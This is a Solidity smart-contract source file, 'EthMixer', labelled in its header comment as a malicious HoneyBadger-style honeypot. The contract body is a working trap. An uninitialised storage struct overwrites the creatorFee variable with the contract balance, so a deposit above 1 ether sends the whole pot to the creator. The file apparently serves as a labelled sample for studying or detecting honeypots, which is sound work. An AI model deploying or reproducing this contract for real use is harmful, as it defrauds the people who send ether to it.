// MALICIOUS — HoneyBadger "uninitialised struct": `Transfer LogUnit;` is a storage pointer to slot 0 (pre-0.5), so
// `LogUnit.currContractBallance = this.balance` overwrites `creatorFee` — creator.send(creatorFee) then drains the pot.
pragma solidity ^0.4.19;

contract EthMixer {
    uint256 feePaid;
    uint256 creatorFee = 0.001 ether;
    uint256 totalTransfered;

    struct Transfer {
        uint256 timeStamp;
        uint256 currContractBallance;
        uint256 transferAmount;
    }

    Transfer[] Log;
    address creator = msg.sender;

    function() public payable {}

    function MakeTransfer(address _adr, uint256 _am) external payable {
        if (msg.value > 1 ether) {
            require(msg.sender == tx.origin);
            Transfer LogUnit;
            LogUnit.timeStamp = now;
            LogUnit.currContractBallance = this.balance;
            LogUnit.transferAmount = _am;
            Log.push(LogUnit);
            creator.send(creatorFee);
            _adr.send(_am);
            feePaid += creatorFee;
            totalTransfered += _am;
        }
    }
}
